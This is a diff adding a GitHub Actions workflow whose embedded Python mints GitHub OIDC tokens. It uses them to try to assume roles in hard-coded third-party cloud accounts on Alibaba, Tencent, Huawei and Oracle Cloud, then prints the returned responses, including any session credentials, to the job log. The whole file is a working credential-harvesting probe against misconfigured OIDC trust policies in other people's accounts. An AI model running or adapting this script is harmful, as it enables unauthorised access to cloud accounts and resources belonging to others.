@@ -1,0 +1,73 @@
+name: c211-i119945-nonbig3
+on: workflow_dispatch
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: mint-and-exchange
+        run: |
+          python3 - <<'PY'
+          import json, os, urllib.request, urllib.error, urllib.parse, base64
+          base=os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']; tok=os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']
+          def mint(aud):
+              url=base+('&' if '?' in base else '?')+'audience='+urllib.parse.quote(aud)
+              req=urllib.request.Request(url,headers={'Authorization':'Bearer '+tok,'Accept':'application/json','User-Agent':'c211'})
+              return json.loads(urllib.request.urlopen(req,timeout=30).read())['value']
+          def claims(jwt):
+              p=jwt.split('.')[1]; p+='='*(-len(p)%4)
+              return json.loads(base64.urlsafe_b64decode(p))
+          def post(url,data,headers=None):
+              if isinstance(data,dict):
+                  body=urllib.parse.urlencode(data).encode(); hdrs=headers or {'Content-Type':'application/x-www-form-urlencoded'}
+              else:
+                  body=data; hdrs=headers or {'Content-Type':'application/json'}
+              req=urllib.request.Request(url,data=body,headers=hdrs)
+              try:
+                  r=urllib.request.urlopen(req,timeout=35); return r.status, r.read().decode('utf-8','replace')[:700]
+              except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8','replace')[:700]
+              except Exception as e: return -1, str(e)[:200]
+          out={}
+          ja=mint('sts.aliyuncs.com'); ca=claims(ja)
+          out['mint']={'sub':ca.get('sub'),'iss':ca.get('iss'),'aud':ca.get('aud'),'token_len':len(ja)}
+          ali=[('1083406401917880','gh-oidc-mcpywrap-site-deploy'),
+               ('1145786521954482','teable-cn-test-github-deploy'),
+               ('1238311235538497','github-actions-deploy-role'),
+               ('1354810585726671','docker-registry'),
+               ('1632903580111839','github-actions'),
+               ('5621254376179407','docker'),
+               ('1031059086324334','baby-diary-fc-deploy')]
+          for acct,role in ali:
+              st,b=post('https://sts.aliyuncs.com/',{'Action':'AssumeRoleWithOIDC','Version':'2015-04-01',
+                  'OIDCProviderArn':'acs:ram::%s:oidc-provider/github-actions'%acct,
+                  'RoleArn':'acs:ram::%s:role/%s'%(acct,role),'OIDCToken':ja,'DurationSeconds':'3600'})
+              out['ali::%s::%s'%(acct,role)]={'http':st,'body':b}
+          try:
+              jt=mint('sts.tencentcloudapi.com'); ct=claims(jt)
+          except Exception as e:
+              jt=None; out['tc_mint_err']=str(e)[:200]
+          if jt:
+              for u,rn in [('100021031865','demox-ci-deploy'),('100052992193','demox-ci-deploy'),('100022600923','KsamintVaultStsRole')]:
+                  st,b=post('https://sts.tencentcloudapi.com/',{'Action':'AssumeRoleWithWebIdentity','Version':'2018-08-13',
+                      'ProviderId':'github','WebIdentityToken':jt,'RoleArn':'qcs::cam::uin/%s:roleName/%s'%(u,rn),
+                      'RoleSessionName':'c211i119945'},{'Content-Type':'application/x-www-form-urlencoded','X-TC-Action':'AssumeRoleWithWebIdentity','X-TC-Version':'2018-08-13'})
+                  out['tc::%s::%s'%(u,rn)]={'http':st,'body':b}
+          jh=mint('sts.huaweicloud.com')
+          for host in ['iam.myhuaweicloud.com','iam.ap-southeast-1.myhuaweicloud.com','iam.cn-north-4.myhuaweicloud.com']:
+              body=json.dumps({'auth':{'id_token':{'id':jh,'method':'openid connect','provider':'github_com'}}}).encode()
+              st,b=post('https://%s/v3.0/OS-AUTH/id-token/tokens'%host,body,{'Content-Type':'application/json;charset=utf8'})
+              out['hw::'+host]={'http':st,'body':b}
+          jo=mint('oci'); co=claims(jo)
+          out['oci_mint']={'sub':co.get('sub'),'aud':co.get('aud'),'token_len':len(jo)}
+          for dom,cid in [('idcs-2615d95acce94592a217756c7d2f8c48','b15094b8f4204b76a7a834f189221284'),
+                          ('idcs-8dd307747946491cbfe1b7a3f063db0d','8aa264f421d646e98699b716b2e9b72e')]:
+              data={'grant_type':'urn:ietf:params:oauth:grant-type:token-exchange',
+                    'requested_token_type':'urn:oci:token-type:resource-principal-session-token',
+                    'subject_token':jo,'subject_token_type':'urn:ietf:params:oauth:token-type:jwt',
+                    'audience':'https://%s.identity.oraclecloud.com'%dom}
+              st,b=post('https://%s.identity.oraclecloud.com/oauth2/v1/token'%dom,data)
+              out['oci::'+dom]={'http':st,'body':b}
+          print('C211_I119945_RESULT='+json.dumps(out))
+          PY
